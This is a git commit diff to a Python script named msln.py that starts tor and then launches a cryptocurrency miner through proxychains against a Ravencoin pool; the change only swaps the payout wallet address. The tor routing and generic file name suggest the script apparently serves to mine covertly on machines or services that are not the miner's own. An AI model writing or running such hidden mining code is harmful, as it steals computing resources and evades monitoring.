3fb8e215ef80c9e31e7cf983b681b50f0f489cc4
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2023-09-07 19:02:06 +0700

    Update msln.py

--- msln.py
+++ msln.py
@@ -33,4 +33,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --algo kawpow --server rvn.2miners.com:16060 --user RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx.ml -p x --ssl 1 ' )
+os.system ('proxychains4 ' + program + ' --algo kawpow --server rvn.2miners.com:16060 --user RPebrS7sKNBetCdw3xE1HJiAuv1S1T7uEo.px -p x --ssl 1 ' )
